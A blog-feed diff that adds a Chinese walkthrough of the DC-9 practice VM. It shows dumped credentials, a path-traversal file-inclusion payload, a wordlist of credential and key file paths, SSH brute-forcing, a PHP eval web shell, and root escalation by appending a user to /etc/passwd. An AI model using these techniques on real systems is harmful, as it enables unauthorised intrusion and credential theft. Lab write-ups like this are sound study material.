|</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">+-----------+---------------+</span><br></pre></td></tr></table></figure></p>
+<p>Users表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+</span><br><span class="line">| Password                         | username |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 856f5de590ef37314e7c3bdf6f8a66dc | admin    |</span><br><span class="line">+----------------------------------+----------+</span><br></pre></td></tr></table></figure><br>StaffDetails表下只有用户信息，没有密码之类的，就没有dump了</p>
+<p>admin的那条密码在somd5.com解码出来了<br>admin<br>transorbital1</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>后台有一个插入数据的功能，应该是要用这个来getshell，<br>试了一些办法，没成功<br>后面看别人的，还是dc-5那个文件包含<br>拿bp爆破一下参数</p>
+<p><img src="image-20210618095436533.png" alt="image-20210618095436533"></p>
+<p><a class="link" href="http://192.168.243.135/manage.php?file=../../../../../../etc/passwd">http://192.168.243.135/manage.php?file=../../../../../../etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以看到用户挺多的，然后开了22端口，不知道爆破能不能爆出来<br>处理一下数据，准备ssh爆破</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
+<p>ssh连接不上，还是准备和dc-5一样的日志getshell吧<br>测了一下，日志读不到，裂开<br>决定爆破一下敏感文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;apache&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;vhosts.d&#x2F;00_default_vhost.conf</span><br><span class="line">&#x2F;etc&#x2F;at.allow</span><br><span class="line">&#x2F;etc&#x2F;at.deny</span><br><span class="line">&#x2F;etc&#x2F;cron.allow</span><br><span class="line">&#x2F;etc&#x2F;cron.deny</span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;fstab</span><br><span class="line">&#x2F;etc&#x2F;host.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;httpd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">&#x2F;etc&#x2F;ld.so.conf</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;etc&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">&#x2F;etc&#x2F;networks</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4.4&#x2F;fcgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;phpmyadmin&#x2F;config.inc.php</span><br><span class="line">&#x2F;etc&#x2F;resolv.conf</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;home&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;home2&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;NetServer&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;opt&#x2F;xampp&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;PHP&#x2F;php.ini</span><br><span class="line">&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;root&#x2F;.atftp_history</span><br><span class="line">&#x2F;root&#x2F;.bashrc</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;root&#x2F;.nano_history</span><br><span class="line">&#x2F;root&#x2F;.php_history</span><br><span class="line">&#x2F;root&#x2F;.profile</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br><span class="line">&#x2F;root&#x2F;anaconda-ks.cfg</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_logaccess_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_logerror_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;license_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;login_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;php5.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat5527&#x2F;bin&#x2F;version.sh</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;Zend&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;usr&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-bin.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-slow.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysqlderror.log</span><br><span class="line">&#x2F;var&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;web&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;www&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">root&#x2F;.ssh&#x2F;identity</span><br><span class="line">root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
+<p>丢bp里爆破，也没找到什么东西，</p>
+<h2 id="knockd，ssh连接getshell"><a href="#knockd，ssh连接getshell" class="headerlink" title="knockd，ssh连接getshell"></a>knockd，ssh连接getshell</h2><p>还是去看别人的过程，要读</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;knockd.conf</span><br></pre></td></tr></table></figure>
+<p>这个文件，然后去查了一下这个玩意，大概是，要先访问sequence指定的端口，才会打开或者关闭对应的端口<br>比如这里，</p>
+<p><img src="image-20210618103630995.png" alt="image-20210618103630995"></p>
+<p>openSSH下面的sequence指定了7469,8475,9842三个端口，在不访问这几个端口前，直接ssh连接过去，是会被拒绝的</p>
+<p><img src="image-20210618103806549.png" alt="image-20210618103806549"></p>
+<p>但访问了这些端口后，这里我用的telnet</p>
+<p>telnet 192.168.243.135 7469<br>telnet 192.168.243.135 8475<br>telnet 192.168.243.135 9842</p>
+<p><img src="image-20210618103838621.png" alt="image-20210618103838621"></p>
+<p><img src="image-20210618103858499.png" alt="image-20210618103858499"></p>
+<p>就可以正常连接ssh（虽然现在还是不知道密码）<br>然后就去hydra里用找到的账号密码去爆破ssh密码了<br>[22][ssh] host: 192.168.243.135   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.243.135   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.243.135   login: janitor   password: Ilovepeepee</p>
+<p>chandlerb<br>UrAG0D!</p>
+<p>joeyt<br>Passw0rd</p>
+<p>janitor<br>Ilovepeepee</p>
+<p>在/var/www/html/config.php里找到了数据库密码<br>dbuser<br>password<br>没啥用的样子，<br>在/opt/devstuff下面发现有个python文件</p>
+<p><img src="image-20210618130546428.png" alt="image-20210618130546428"></p>
+<p>可以读写文件，试了一下写一个一句话到/var/html/www/bak<br>echo “<?php @eval($_POST[cmd]); ?>“ &gt; /tmp/shell.php<br>python test.py /tmp/shell.php  /var/www/html/bak.manage.php</p>
+<p><img src="image-20210618133819795.png" alt="image-20210618133819795"></p>
+<p>报错了。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在janitor下面发现了一个文本文件，里面有些密码</p>
+<p><img src="image-20210618133916295.png" alt="image-20210618133916295"></p>
+<p>拿出来，再去爆破一下，出来一个新用户，<br>[22][ssh] host: 192.168.243.135   login: fredf   password: B4-Tru3-001<br>fredf<br>B4-Tru3-001<br>果然，sudo -l发现它可以不用密码用sudo执行一个test文件，这里的看文件结构，应该是把test.py打包成了可执行文件，</p>
+<p>这样子就可以向任意文件写入数据了<br>sudo ./test /tmp/shell.php  /var/www/html/bak.manage.php</p>
+<p>所以这里我在tmp目录下写了一个shell。然后用test把它写入到index.php中，再用蚁剑连接上去</p>
+<p><img src="image-20210618144957050.png" alt="image-20210618144957050"></p>
+<p>(发现多此一举。: p)</p>
+<p>直接写入一个用户到passwd文件里就行<br>    openssl password -1 -salt admin2 admin2</p>
+<pre><code>$1$admin2$Pr1254RlLuWxoieYEI.Sa0
+</code></pre>
+<p>拼接好数据后，写入到/tmp/get文件里，（只有这里可以任意写文件）<br>    echo ‘admin2:$1$admin2$Pr1254RlLuWxoieYEI.Sa0:0:0::/:/bin/bash’ &gt; /tmp/get</p>
+<p>然后用test写入到passwd<br>    sudo /opt/devstuff/dist/test/test /tmp/get /etc/passwd</p>
+<p>之后直接su admin2<br>切换过去，就可以看到flag了</p>
+<p><img src="image-20210618155522983.png" alt="image-20210618155522983"></p>
+<p>可能是因为是最后一个靶机，最后的结束语都有些不一样</p>
+<p>So long, and thanks for all the fish.</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于粗心，注入的时候没有第一时间找到各个用户的密码，导致后面ssh爆破的时候傻乎乎的花了很多时间，过于粗心。文件包含这个很早就注意过了，但是却没有想到去文件包含（他已经考过一次），后面提权的时候，直接写入passwd文件创建用户，这一点以前没有碰过。</p>
+]]></content>
   </entry>
   <entry>
     <title>JS学习中的细节</title>
@@ -1528,22 +1764,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>OWASP Top10</title>
-    <url>/2021/05/12/OWASP-Top10/</url>
-    <content><![CDATA[<h1 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1 注入"></a>A1 注入</h1><p>  将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
-<h1 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h1><p>  通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
-<h1 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h1><p>  许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
-<h1 id="A4-XML外部实体（XXE）"><a href="#A4-XML外部实体（XXE）" class="headerlink" title="A4 XML外部实体（XXE）"></a>A4 XML外部实体（XXE）</h1><p>  许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
-<h1 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5 失效的访问控制"></a>A5 失效的访问控制</h1><p>  未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
-<h1 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
-<h1 id="A7-跨站脚本（XSS）"><a href="#A7-跨站脚本（XSS）" class="headerlink" title="A7 跨站脚本（XSS）"></a>A7 跨站脚本（XSS）</h1><p>  当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
-<h1 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8 不安全的反序列化"></a>A8 不安全的反序列化</h1><p>  不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
-<h1 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h1><p>  组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
-<h1 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h1><p>  不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
-<p>pdf： [OWASP Top 10 2017 4e2d65877248v1.0-2.pdf](......\0_IDM_Download\OWASP Top 10 2017 4e2d65877248v1.0-2.pdf) </p>
-]]></content>
-  </entry>
-  <entry>
     <title>PHP学习笔记</title>
     <url>/2019/09/08/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11466633.html">源地址：https://www.cnblogs.com/This-is-Y/p/11466633.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1682,51 +1902,20 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>POST和GET的部分知识</title>
-    <url>/2020/01/30/POST%E5%92%8CGET%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">源地址：https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="POST和GET的使用场景"><a href="#POST和GET的使用场景" class="headerlink" title="POST和GET的使用场景"></a>POST和GET的使用场景</h3><p>1.请求中包含数据更新等<strong>副作用</strong>时</p>
-<p>2.发送敏感信息时(防止Referer等安全隐患)</p>
-<p>3.发送的信息量很多时(URL长度有限，但是http协议并未规定get和post的长度限制，长度限制来源与浏览器与web服务器，而不同的浏览器和web服务器，限制的最大长度不一样)</p>
-<p>(副作用是指除了获取资源(内容)以外的其他作用,比如追加，更新，删除服务器段数据，购买商品，注册/删除用户等操作，换言之，<strong>更新类的页面必须使用POST方法</strong>)</p>
-<p> </p>
-<p>当发送的请求有上述其中一条以上时，应该使用POST</p>
-<p> </p>
-<p>POST和GET方法的优缺点：</p>
-<p>　　这里先放一篇写的很不错的博客链接：<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　以及知乎一篇关于POST和GET的帖子：<a class="link" href="https://zhuanlan.zhihu.com/p/73475134">https://zhuanlan.zhihu.com/p/73475134<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　简单总结一下：</p>
-<ol>
